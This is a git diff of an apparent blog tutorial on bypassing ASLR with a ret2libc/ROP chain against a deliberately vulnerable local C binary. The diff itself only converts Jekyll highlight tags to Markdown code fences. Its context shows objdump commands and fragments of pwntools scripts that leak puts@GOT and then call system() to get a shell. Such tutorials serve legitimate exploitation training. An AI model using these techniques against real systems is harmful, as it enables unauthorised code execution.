@@ -25,7 +25,7 @@ Given a vulnerable binary, let's consider the following scenario:
 
 While writing this, I've been using this really simple binary (vuln.c):
 
-{% highlight c linenos %}
+```c
 #include<stdio.h>
 
 int main()
@@ -37,14 +37,14 @@ int main()
 
     return 0;
 }
-{% endhighlight %}
+```
 
 Compiled with the following parameters:
 
 
-{% highlight bash linenos %}
+```bash
 gcc -Wall -ansi -fno-stack-protector vuln.c -o vuln
-{% endhighlight %}
+```
 
 
 ## Step 1: Basic Buffer Overflow
@@ -99,8 +99,8 @@ We'll want our initial payload to perform such a call in order to have an initia
 
 Start by running the following command so you can view the address of `puts@GOT`:
 
-{% highlight bash linenos %}
-objdump -R vuln {% endhighlight %}
+```bash
+objdump -R vuln ```
 
 Pay attention at the second row and write down the address:
 
@@ -126,9 +126,9 @@ We'll get the following line:
 The last thing that the payload requires is a way to call `puts()`. We can achieve this by calling `puts@PLT` (through the **PLT** trampoline) since its address is also fixed and unaffected by **ASLR**.  
 You can use something like this to extract the address from the binary:
 
-{% highlight bash linenos %}
+```bash
 objdump -d -M intel vuln | grep "puts@plt"
-{% endhighlight %}
+```
 
 I got something like this:
 
@@ -141,7 +141,7 @@ The new flow of the program must be the following:
 
 RET to pop_rdi_ret_address -> (RDI = puts@GOT) RET to puts_plt_address -> RET to main  
 
-{% highlight python linenos %}
+```python
 from pwn import *
 
 r = process('vuln')
@@ -163,7 +163,7 @@ print('leaked puts() address', leaked_output)
 r.sendline('a')
 print r.recvline() # "hi there"
 
-{% endhighlight %}
+```
 
 
 And when running it...
@@ -179,10 +179,10 @@ We know, from the previous **ldd** run, that the binary uses the libc located at
 
 Running the following commands will return the **offsets** of `system()` and `puts()` from libc:
 
-{% highlight bash linenos %}
+```bash
 objdump -d -M intel /lib/x86_64-linux-gnu/libc.so.6 | grep "system"
 objdump -d -M intel /lib/x86_64-linux-gnu/libc.so.6 | grep "_IO_puts"
-{% endhighlight %}
+```
 
 The lines of interest are:
 
@@ -202,7 +202,7 @@ By adding the offset of `system()` we get a call to `system@libc`.
 
 Now, we can adapt the previous script in order to create the second payload that makes the call.
 
-{% highlight python linenos %}
+```python
 from pwn import *
 
 r = process('vuln')
@@ -243,7 +243,7 @@ print(r.recvline()) # hi there
 r.sendline(payload)
 
 r.interactive()
-{% endhighlight %}
+```
 
 
 ## Small Proof-Of-Concept
